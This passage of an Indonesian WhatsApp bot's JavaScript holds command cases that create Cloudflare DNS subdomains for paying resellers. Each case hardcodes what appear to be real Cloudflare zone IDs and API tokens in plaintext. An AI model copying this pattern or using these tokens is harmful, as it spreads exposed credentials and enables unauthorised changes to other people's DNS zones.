if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
Biiofc.public = true
reply(`*SUKSES MODE PUBLIC TUAN✅*`)
}
break
case "self": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
Biiofc.public = false
reply(`*SUKSES MODE SELF TUAN✅*`)
}
break
          case 'domain1': {
    if (!jangan) return reply("Fitur Ini Khusus Untuk Reseller Subdomain Denz Hosting\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6287810274242")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Denz Hosting⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain2': {
    if (!jangan) return reply("Fitur Ini Khusus Untuk Reseller Subdomain Denz Hosting\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6287810274242")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Denz Hosting⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain3': {
    if (!jangan) return reply("Fitur Ini Khusus Untuk Reseller Subdomain Denz Hosting\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6287810274242")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Denz Hosting⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain4': {
    if (!jangan) return reply("Fitur Ini Khusus Untuk Reseller Subdomain Vallz\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6287810274242")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Denz Hosting⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
           
          break
          case 'domain5': {
    if (!jangan) return reply("Fitur Ini Khusus Untuk Reseller Subdomain Denz Hosting\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6287810274242")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Denz Hosting⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
           
          break

 case 'domain6': {
    if (!jangan) return reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba23ecc16636dce6d78e8d11c6c36bd7";
               let apitoken = "PrrlP5uUP4xCCo2GQnFWZ6jklJEuIloNx1L_wihX";
               let tld = "panellstore.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
           break
case 'domain7': {
 
    if (!jangan) return reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5daeb6706448cbba471723b3d7aedd2b";
               let apitoken = "6NWB4uydHcwRB1WdnBTr2RqJsFxYe9NiTQDW26m0";
               let tld = "panellzku-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
           break
case 'domain8': {
    if (!isOwner) return reply(`khusus Creator`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4ae1a9c88c05b5dae50644da191fb9c0";
               let apitoken = "Pmon7jvu1ervrXJp-eVBTK-SCHtilh4l8K12qK4K";
               let tld = "denzhosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain9': {
    if (!jangan) return m.reply("Mohon Maap, Group Ini Tidak Terdaftar Di Dalam Database Kami")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e74f8ee834c9e5befc8157b547c569d2";
               let apitoken = "HrmmMXyuwNoMRdCpqHL2eBSJjNBNH3pMDgPSSUgL";
               let tld = "sellerpanel-store.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
               break
           case 'domain10': {
    if (!jangan) return m.reply("Mohon Maap, Group Ini Tidak Terdaftar Di Dalam Database Kami")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0cf0d98bcb60af202ad5816f672ca471";
               let apitoken = "f5ApkZpsRdJxTuA0xlfr9vCJ1bknGAAJ7rv10H_f";
               let tld = "sellerpanell-store.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain11': {
    if (!jangan) return m.reply("Mohon Maap, Group Ini Tidak Terdaftar Di Dalam Database Kami")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "10c64e8686cc1f48b800e10441a29194";
               let apitoken = "0RYAIqb8Nx3wCBsXkhKnAjmgTXN37huKfIjGpV55";
               let tld = "mypanell-store.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
case 'domain12': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "be10c7132ff11db083f0286d61a0e44b";
               let apitoken = "Wg5KU_sgk56M3tQ9g3SFkrsfZgt6O_Gcz19z92RG";
               let tld = "jasa-install.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
case 'domain13': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a8cfe4e120b864e36718e714f40a781d";
               let apitoken = "Wg5KU_sgk56M3tQ9g3SFkrsfZgt6O_Gcz19z92RG";
               let tld = "adminpanelku.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
           break
case 'domain14': {
 if (!isOwner) return m.reply(`khusus Creator`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "09adab11231175aabbc611d087d312e7";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "panellku-vvip.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
          break
case 'domain15': {
    if (!isOwner) return m.reply(`khusus Creator`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "28a706fd313c9fefea70c8c4475bdf74";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "panellku-vvip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
case 'domain18': {
    if (!isOwner) return m.reply(`khusus Creator`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6cbcca73a1d2eadde62edfd18d29f65d";
               let apitoken = "8hA4i28Ulod0AoDA_wuWaHiKqAPh_tZ6b4kphQbn";
               let tld = "crazyyhosting.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
